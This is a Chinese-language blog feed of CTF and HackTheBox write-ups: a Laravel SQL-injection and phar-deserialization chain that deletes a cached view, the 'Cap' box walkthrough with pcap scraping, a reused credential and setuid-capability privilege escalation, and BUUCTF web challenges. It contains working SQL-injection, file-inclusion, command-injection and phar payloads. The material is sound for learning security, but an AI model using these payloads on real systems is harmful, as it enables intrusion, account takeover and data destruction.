alt="image-20240921111419255"></p><p>注入点是<code>username</code>,先用order判断列数为5，再看回显位置为第2列</p><p>根据之前的发现，需要先去点一下发送链接等系统创建token，接着注入</p><p><code>water3&#39; union select 1,(select token from password_resets where email=&#39;admin@qvq.im&#39;),3,4,5--</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322855.png" alt="image-20240921112242050"></p><p>拿token去修改密码登录admin</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322856.png" alt="image-20240921112414932"></p><p>flag为空，这里我看源码没有问题但是不知道为什么不显示，看到upload知道应该要做文件上传，但是这里依然很疑惑</p><p>先看下文件上传控制器：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322857.png" alt="image-20240921112849500"></p><p>这里设置文件后缀的检测，并且给了文件存储位置，但是访问不了，好像无法利用？再看下框架：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322858.png" alt="image-20240921121600020"></p><p>搜索一下相关漏洞，有一个<code>CVE-2021-3129</code>,但是需要<code>Ignition</code>组件，这里并没有安装这个组件。</p><p>到这里实在没什么办法了，去看一下其他师傅的做法</p><p><a href="https://venenof.com/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF-easy-laravel-Writeup/">护网杯-easy laravel-Writeup | venenof7’s blog</a></p><p><a href="https://cloud.tencent.com/developer/article/1367783">护网杯easy laravel ——Web菜鸡的详细复盘学习-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://xz.aliyun.com/t/2912?time__1311=n4+xni0=i=DtitEYGNDQTPiKG=kWq7Ieqw5Qx">护网杯2018 easy_laravel writeup与记录 - 先知社区 (aliyun.com)</a></p><p>得知了无法显示flag的原因：</p><blockquote><p>直接访问会发现页面提示 <code>no flag</code>，这里页面内容不一致，在 laravel 中，模板文件是存放在 <code>resources/views</code> 中的，然后会被编译放到 <code>storage/framework/views</code> 中，而编译后的文件存在过期的判断。</p><p>在 <code>Illuminate/View/Compilers/Compiler.php</code> 中可以看到</p><pre><code>/** * Determine if the view at the given path is expired. * * @param  string  $path * @return bool */public function isExpired($path)&#123;    $compiled = $this-&gt;getCompiledPath($path);    // If the compiled file doesn&#39;t exist we will indicate that the view is expired    // so that it can be re-compiled. Else, we will verify the last modification    // of the views is less than the modification times of the compiled views.    if (! $this-&gt;files-&gt;exists($compiled)) &#123;        return true;    &#125;    $lastModified = $this-&gt;files-&gt;lastModified($path);    return $lastModified &gt;= $this-&gt;files-&gt;lastModified($compiled);&#125;而过期时间是依据文件的最后修改时间来判断的，所以判断服务器上编译后的文件最后修改时间大于原本模板文件，那么怎么去删除(修改)编译后的文件?</code></pre></blockquote><p>大概就是说Laravel的模版缓存没有更新，我们要进去把他删除掉让他重新渲染出有flag的页面。</p><p>这里的漏洞是是 <code>file_exists</code> 中的参数完全可控，所以可以使用 <code>phar://</code> 协议来触发一次反序列化操作，先了解一下phar:&#x2F;&#x2F;</p><p>在之前只知道这是个php伪协议，由于用得不多所以掌握得不是很好</p><p><a href="https://blog.csdn.net/abc18964814133/article/details/124664538">文件包含之——phar伪协议_phar协议-CSDN博客</a></p><blockquote><p>phar:&#x2F;&#x2F;伪协议<br>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意 PHP&gt;&#x3D;5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p><p>……..</p><p>总结<br>phar:&#x2F;&#x2F;伪协议<br>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意 PHP&gt;&#x3D;5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式<br>————————————————</p><pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</code></pre><p>原文链接：<a href="https://blog.csdn.net/abc18964814133/article/details/124664538">https://blog.csdn.net/abc18964814133/article/details/124664538</a></p></blockquote><p>反序列化删除文件，那么需要先找一个能删除文件的方法,并且包含在魔法函数中：</p><p><a href="https://blog.csdn.net/Klaus_S/article/details/131439581">PHP 删除文件、文件夹方式-CSDN博客</a></p><p>主要是unlink()和rmdir()两个函数,先全局搜索一下unink(:</p><p>最终发现有一个析构函数中包含了unlink:<code>Swift_ByteStream_TemporaryFileByteStream</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322859.png" alt="image-20240921130237424"></p><p>&#x3D;&#x3D;&gt;</p><pre><code>&lt;?php/** This file is part of SwiftMailer.* (c) 2004-2009 Chris Corbyn** For the full copyright and license information, please view the LICENSE* file that was distributed with this source code.*//** * @author Romain-Geissler */class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream&#123;    public function __construct()    &#123;        $filePath = tempnam(sys_get_temp_dir(), &#39;FileByteStream&#39;);        if ($filePath === false) &#123;            throw new Swift_IoException(&#39;Failed to retrieve temporary file name.&#39;);        &#125;        parent::__construct($filePath, true);    &#125;    public function getContent()    &#123;        if (($content = file_get_contents($this-&gt;getPath())) === false) &#123;            throw new Swift_IoException(&#39;Failed to get temporary file content.&#39;);        &#125;        return $content;    &#125;    public function __destruct()    &#123;        if (file_exists($this-&gt;getPath())) &#123;            @unlink($this-&gt;getPath());        &#125;    &#125;&#125;</code></pre><p>最后结尾部分，描述得最清楚得是这个：</p><p><a href="https://blog.csdn.net/Tel_milk/article/details/127979878">18年护网杯 Easy Laravel Writeup_writeup 模板-CSDN博客</a></p><p>由于对于反序列化不是很了解，这里大概有两种payload：</p><p>一种是<a href="https://cloud.tencent.com/developer/article/1367783">护网杯easy laravel ——Web菜鸡的详细复盘学习-腾讯云开发者社区-腾讯云 (tencent.com)</a>：</p><pre><code>//完整脚本 &lt;?php     include(&#39;autoload.php&#39;);     $a = serialize(new Swift_ByteStream_TemporaryFileByteStream());     $a = preg_replace(&#39;/C:.*tmp/&#39;, &quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $a);     $a = str_replace(&#39;s:45&#39;, &#39;s:90&#39;, $a);     var_dump(unserialize($a));     $b = unserialize($a);     $p = new Phar(&#39;./exp.phar&#39;, 0);     $p-&gt;startBuffering();     $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);     $p-&gt;setMetadata($b);     $p-&gt;addFromString(&#39;test.txt&#39;,&#39;text&#39;);     $p-&gt;stopBuffering(); ?&gt;构造post参数调用phar://协议读源码可以找到上传路径/storage/app/public//app\Http\Controllers\UploadController.php class UploadController extends Controller &#123;     public function __construct()     &#123;         $this-&gt;middleware([&#39;auth&#39;, &#39;admin&#39;]);         $this-&gt;path = storage_path(&#39;app/public&#39;);     &#125;又因为nginx是默认配置所以完整路径是/usr/share/nginx/html/storage/app/publiccheck时抓包会发现只有file参数不过源码里面可以看见其实还隐含了path参数//\app\Http\Controllers\UploadController.php $path = $request-&gt;input(&#39;path&#39;, $this-&gt;path);         $filename = $request-&gt;input(&#39;filename&#39;, null);         if($filename)&#123;             if(!file_exists($path . $filename))&#123;加入path参数拼接直接使用phar伪协议访问了exp.gif</code></pre><p>属于是手动替换原始反序列化的参数</p><p>另一种<a href="https://blog.csdn.net/Tel_milk/article/details/127979878">18年护网杯 Easy Laravel Writeup_writeup 模板-CSDN博客</a></p><pre><code>&lt;?phpabstract class Swift_ByteStream_AbstractFilterableInputStream&#123;    /**     * Write sequence.     */    protected $_sequence = 0;     /**     * StreamFilters.     *     * @var Swift_StreamFilter[]     */    private $_filters = array();     /**     * A buffer for writing.     */    private $_writeBuffer = &#39;&#39;;     /**     * Bound streams.     *     * @var Swift_InputByteStream[]     */    private $_mirrors = array(); &#125; class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream&#123;    /** The internal pointer offset */    private $_offset = 0;     /** The path to the file */    private $_path;     /** The mode this file is opened in for writing */    private $_mode;     /** A lazy-loaded resource handle for reading the file */    private $_reader;     /** A lazy-loaded resource handle for writing the file */    private $_writer;     /** If magic_quotes_runtime is on, this will be true */    private $_quotes = false;     /** If stream is seekable true/false, or null if not known */    private $_seekable = null;     public function __construct($path, $writable = false) &#123;        $this-&gt;_path = $path;        $this-&gt;_mode = $writable ? &#39;w+b&#39; : &#39;rb&#39;;         if (function_exists(&#39;get_magic_quotes_runtime&#39;) &amp;&amp; @get_magic_quotes_runtime() == 1) &#123;            $this-&gt;_quotes = true;        &#125;    &#125;     /**     * Get the complete path to the file.     *     * @return string     */    public function getPath()    &#123;        return $this-&gt;_path;    &#125; &#125; class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream&#123;    public function __construct()    &#123;        $filePath = &quot;/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php&quot;;         parent::__construct($filePath, true);    &#125;    public function __destruct()    &#123;        if (file_exists($this-&gt;getPath())) &#123;            @unlink($this-&gt;getPath());        &#125;    &#125;&#125;  $obj = new Swift_ByteStream_TemporaryFileByteStream();$p = new Phar(&#39;./1.phar&#39;, 0);$p-&gt;startBuffering();$p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);$p-&gt;setMetadata($obj);$p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);$p-&gt;stopBuffering();?&gt;</code></pre><p>直接使用继承，个人更推荐后一种，防止手动计算链子的时候出错。</p><p>上岸之后直接放飞自我了，现在开始工作了又继续学习渗透，目前属于是卡住了不知道怎么提升，一个是手生了之前写的都觉得陌生，一个是对于接下来学什么没有明确的方向感，打算先在空余时间学习一下靶场里的困难题，学习一下各种思路什么的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XCTF-easylaravel&quot;&gt;&lt;a href=&quot;#XCTF-easylaravel&quot; class=&quot;headerlink&quot; title=&quot;XCTF_easylaravel&quot;&gt;&lt;/a&gt;XCTF_easylaravel&lt;/h1&gt;&lt;p&gt;首先关于Laravel：&lt;a</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="laravel" scheme="https://taninluv.github.io/tags/laravel/"/>
    
    <category term="blade" scheme="https://taninluv.github.io/tags/blade/"/>
    
    <category term="xctf" scheme="https://taninluv.github.io/tags/xctf/"/>
    
    <category term="pop chainr" scheme="https://taninluv.github.io/tags/pop-chainr/"/>
    
  </entry>
  
  <entry>
    <title>HTB_WP</title>
    <link href="https://taninluv.github.io/2024/08/29/HTB-WP/"/>
    <id>https://taninluv.github.io/2024/08/29/HTB-WP/</id>
    <published>2024-08-29T06:41:39.000Z</published>
    <updated>2024-08-29T08:38:28.516Z</updated>
    
    <content type="html"><![CDATA[<p>Hack the box walkthrough</p><span id="more"></span><h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><p>扫描：</p><blockquote><p>└─# nmap -sC -sV 10.10.10.245<br>Starting Nmap 7.94SVN ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2024-08-28 23:01 EDT<br>Nmap scan report for 10.10.10.245<br>Host is up (1.4s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>21&#x2F;tcp open  ftp     vsftpd 3.0.3<br>22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)<br>|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)<br>|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)<br>80&#x2F;tcp open  http    gunicorn<br>|_http-server-header: gunicorn<br>|<em>http-title: Security Dashboard<br>| fingerprint-strings:<br>|   FourOhFourRequest:<br>|     HTTP&#x2F;1.0 404 NOT FOUND<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:52:06 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Content-Length: 232<br>|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><br>|     <title>404 Not Found</title><br>|     <h1>Not Found</h1><br>|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p><br>|   GetRequest:<br>|     HTTP&#x2F;1.0 200 OK<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:51:51 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Content-Length: 19386<br>|     <!DOCTYPE html><br>|     <html class="no-js" lang="en"><br>|     <head><br>|     <meta charset="utf-8"><br>|     <meta http-equiv="x-ua-compatible" content="ie=edge"><br>|     <title>Security Dashboard</title><br>|     <meta name="viewport" content="width=device-width, initial-scale=1"><br>|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico"><br>|     <link rel="stylesheet" href="/static/css/bootstrap.min.css"><br>|     <link rel="stylesheet" href="/static/css/font-awesome.min.css"><br>|     <link rel="stylesheet" href="/static/css/themify-icons.css"><br>|     <link rel="stylesheet" href="/static/css/metisMenu.css"><br>|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css"><br>|     <link rel="stylesheet" href="/static/css/slicknav.min.css"><br>|     &lt;!– amchar<br>|   HTTPOptions:<br>|     HTTP&#x2F;1.0 200 OK<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:51:52 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Allow: OPTIONS, GET, HEAD<br>|     Content-Length: 0<br>|   RTSPRequest:<br>|     HTTP&#x2F;1.1 400 Bad Request<br>|     Connection: close<br>|     Content-Type: text&#x2F;html<br>|     Content-Length: 196<br>|     <html><br>|     <head><br>|     <title>Bad Request</title><br>|     </head><br>|     <body><br>|     <h1><p>Bad Request</p></h1><br>|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP&#x2F;1.0&amp;#x27;&amp;#x27;<br>|     </body><br>|</em>    </html><br>1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br>SF-Port80-TCP:V&#x3D;7.94SVN%I&#x3D;7%D&#x3D;8&#x2F;28%Time&#x3D;66CFE491%P&#x3D;x86_64-pc-linux-gnu%r(G<br>SF:etRequest,1574,”HTTP&#x2F;1.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:<br>SF:x20Thu,\x2029\x20Aug\x202024\x2002:51:51\x20GMT\r\nConnection:\x20close<br>SF:\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20<br>SF:19386\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class&#x3D;&quot;no-js&quot;\x20lang&#x3D;&quot;en<br>SF:”&gt;\n\n<head>\n\x20\x20\x20\x20&lt;meta\x20charset&#x3D;&quot;utf-8&quot;&gt;\n\x20\x20\x20<br>SF:\x20&lt;meta\x20http-equiv&#x3D;&quot;x-ua-compatible&quot;\x20content&#x3D;&quot;ie&#x3D;edge&quot;&gt;\n\x<br>SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20&lt;me<br>SF:ta\x20name&#x3D;&quot;viewport&quot;\x20content&#x3D;&quot;width&#x3D;device-width,\x20initial-sca<br>SF:le&#x3D;1&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;shortcut\x20icon&quot;\x20type&#x3D;&quot;im<br>SF:age&#x2F;png&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;images&#x2F;icon&#x2F;favicon.ico&quot;&gt;\n\x20\x20\x20\x<br>SF:20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;bootstrap.min.css<br>SF:&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;<br>SF:font-awesome.min.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;<br>SF:x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;themify-icons.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20r<br>SF:el&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;metisMenu.css&quot;&gt;\n\x20\x20\x20<br>SF:\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;owl.carousel.mi<br>SF:n.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;stati<br>SF:c&#x2F;css&#x2F;slicknav.min.css&quot;&gt;\n\x20\x20\x20\x20&lt;!–\x20amchar”)%r(HTTPOpt<br>SF:ions,B3,”HTTP&#x2F;1.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,<br>SF:\x2029\x20Aug\x202024\x2002:51:52\x20GMT\r\nConnection:\x20close\r\nCon<br>SF:tent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nAllow:\x20OPTIONS,\x20GET,<br>SF:\x20HEAD\r\nContent-Length:\x200\r\n\r\n”)%r(RTSPRequest,121,”HTTP&#x2F;1.1<br>SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t<br>SF:ext&#x2F;html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20<br>SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bodSF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv<br>SF:alid\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;R<br>SF:TSP&#x2F;1.0&amp;#x27;&amp;#x27;\n\x20\x20</body>\n</html>\n”)%r(FourOhFourRequest,<br>SF:189,”HTTP&#x2F;1.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x<br>SF:20Thu,\x2029\x20Aug\x202024\x2002:52:06\x20GMT\r\nConnection:\x20close<br>SF:r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x202<br>SF:32\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20&quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD\x20HTML\x203.2<br>SF:x20Final&#x2F;&#x2F;EN&quot;&gt;\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found&lt;&#x2F;<br>SF:h1&gt;\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20<br>SF:server.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2<br>SF:0check\x20your\x20spelling\x20and\x20try\x20again.</p>\n”);<br>Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p><p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 266.91 seconds</p></blockquote><p>看一下web：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829145204826.png" alt="image-20240829145204826"></p><p> 点击安全快照跳转到一个操作面板，可以下载pcap文件，剩下两个按钮可以查看网络状态，但是好像都没什么用</p><p>到处抓包试一下，发现下载按钮的id很明显：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829145514553.png" alt="image-20240829145514553"></p><p>写个简单的脚本挨着下载一下</p><blockquote><p><strong>for</strong> i <strong>in</strong> <strong>{<strong>0..500</strong>}</strong>; <strong>do</strong>   wget 10.10.10.245&#x2F;download&#x2F;<strong>${<strong>i</strong>}</strong> -O pcaps&#x2F;<strong>${<strong>i</strong>}</strong>.pcap 2&gt;&#x2F;dev&#x2F;null <strong>||</strong> break;  <strong>done</strong>;</p></blockquote><p>先查看下载的<code>0.cap</code>,根据之前的端口扫描，开放了FTP端口，可以看一下FTP协议的报文是否有登录记录：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829162841043.png" alt="image-20240829162841043"></p><p>正好有一个，跟踪一下这个tcp流：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829162930597.png" alt="image-20240829162930597"></p><p>看到了账户密码，可以ftp连接也可以ssh连接，ssh正常连接没有成功，学习了一下发现可以这样<code>sshpass</code>：</p><blockquote><p>sshpass -p ‘Buck3tH4TF0RM3!’ ssh <a href="mailto:&#x6e;&#x61;&#116;&#104;&#x61;&#x6e;&#64;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#49;&#48;&#46;&#x32;&#x34;&#53;">&#x6e;&#x61;&#116;&#104;&#x61;&#x6e;&#64;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#49;&#48;&#46;&#x32;&#x34;&#53;</a></p></blockquote><p>登陆上去之后发现一个linux的提权脚本，(lll￢ω￢)</p><p>直接跑一下：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829161641874.png" alt="image-20240829161641874"></p><p>cap提权：</p><p>写一个python脚本然后用这个py3.8运行：</p><pre><code>import osos.setuid(0)os.system(&quot;/bin/bash&quot;)</code></pre><p>或者直接：</p><pre><code>nathan@cap:/var/www/html$ python3Python 3.8.5 (default, Jan 27 2021, 15:41:15) [GCC 9.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import os&gt;&gt;&gt; os.setuid(0)&gt;&gt;&gt; pty.spawn(&quot;bash&quot;)</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;Hack the box walkthrough&lt;/p&gt;</summary>
    
    
    
    
    <category term="HTB" scheme="https://taninluv.github.io/tags/HTB/"/>
    
    <category term="WP" scheme="https://taninluv.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF</title>
    <link href="https://taninluv.github.io/2023/12/04/BUUCTF/"/>
    <id>https://taninluv.github.io/2023/12/04/BUUCTF/</id>
    <published>2023-12-04T02:18:32.000Z</published>
    <updated>2024-07-11T01:38:09.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="warmUp1"><a href="#warmUp1" class="headerlink" title="warmUp1"></a>warmUp1</h1><pre><code>&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#39;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;        include $_REQUEST[&#39;file&#39;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    &#125;  ?&gt;</code></pre><p>mb_strpos()：返回要查找的字符串在另一个一个字符串中首次出现的位置</p><p>mb_substr() 函数返回字符串的一部分。</p><p>这里的payload：</p><pre><code>source.php?file=hint.php?/../../../../../ffffllllaaaagggg</code></pre><p>hint.php后接了一个问号，这里是防止过waf时hint.php&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg整体被waf墙了，用？间隔开，此时判定函数中：</p><pre><code>$_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );</code></pre><p>这一段将截取到hint.php从而绕过waf，否则函数在末尾添加了一个？，导致进入白名单判定的 $page &#x3D;hint.php&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg而不是hint.php,这里进行了两次判定，一次经过了url解码，其实没什么影响，因为不是引用传参，判定的内容都一样。</p><h1 id="Include1"><a href="#Include1" class="headerlink" title="Include1"></a>Include1</h1><p>文件包含</p><p>确认file参数存在文件包含后，不知道flag在哪里，但是发现当前页面就是flag.php。可能得从源码里面看看：</p><pre><code>http://&#123;URL&#125;/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><h1 id="PING-PING-PING"><a href="#PING-PING-PING" class="headerlink" title="PING PING PING"></a>PING PING PING</h1><p>发现过了空格、&lt;  、 &gt; {},这里可以直接使用$IFS</p><p>这里解释一下：</p><blockquote><p>通常使用${VAR}这种形式可以更清晰地表示变量名的边界。$IFS、$IFS$、${IFS}和${IFS}$都是对环境变量$IFS的引用，但是在特殊的上下文中可能会有微小的差异，但通常情况下它们表达的含义是相同的。</p></blockquote><p>然后发现过滤了flag，通配符？和*也被过滤了</p><p>那么可以考虑拼接、内联、编码等方法：</p><pre><code>cat$IFS`ls`</code></pre><pre><code>echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash </code></pre><pre><code>a=g;cat$IFS$1fla$a.php# 这里需要使用$IFS$1，可能是解析的时候界限区分问题</code></pre><h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><ol><li><p>修改表：</p><pre><code>1&#39;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#39;12&#39;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q</code></pre></li><li><p>预编译：</p></li></ol><p>prepare name from statement;</p><p>&#x3D;&#x3D;》预编译的用处在于statement里面可以使用连接字符拼接语句：</p><pre><code>prepare stmt from concat(&quot;selec&quot;,&quot;t flag from `1919810931114514`;&quot;);execute stmt;--+-</code></pre><h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1><p>根本不easy 枯了</p><p>来自：[BUUCTF-<a href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a></p><p>输入非零数字得到结果一直是1和而输入其余字符的数据就得不到回显&#x3D;&gt;来判断出内部的查询语句可能存在有||（即or：或运算）。</p><blockquote><p>payload:1;set sql_mode&#x3D;pipes_as_concat;select 1</p><p>#使用set sql_mode &#x3D; pipes_as_concat将｜｜作为字符串连接函数<br>那么sql语句就会为：<br>select 1;set sql_mode&#x3D;pipes_as_concat;select 1||flag from Flag;<br>即：<br>select 1;set sql_mode&#x3D;pipes_as_concat;select concat(1,flag) from Flag;</p></blockquote><blockquote><p>payload:*,1<br>1可以换成任何数字，但不能是其他（原因不知道）</p><p>这样我们执行的语句就为：<br>select *,1||flag from Flag<br>即：<br>select *,1 from Flag;</p></blockquote><p>第二个方法我觉得应该是select *,TRUE || flag from Flag</p><h1 id="Secret-File-1"><a href="#Secret-File-1" class="headerlink" title="Secret File 1"></a>Secret File 1</h1><pre><code>&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#39;file&#39;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;</code></pre><p>这里</p><blockquote><p>stristr(string,search,before_search) 函数搜索字符串在另一字符串中的第一次出现，不区分大小写，默认返回匹配到的字符串及其之后的字符串</p><table><thead><tr><th><em>before_search</em></th><th>可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>strstr(string,search,before_search) 函数搜索字符串在另一字符串中的第一次出现。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p><strong>注释：</strong>该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 <a href="https://www.w3school.com.cn/php/func_string_stristr.asp">stristr()</a> 函数。</p></blockquote><p>直接包含flag.php即可，这里防止目录穿越好像就没了意义。。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938696.png" 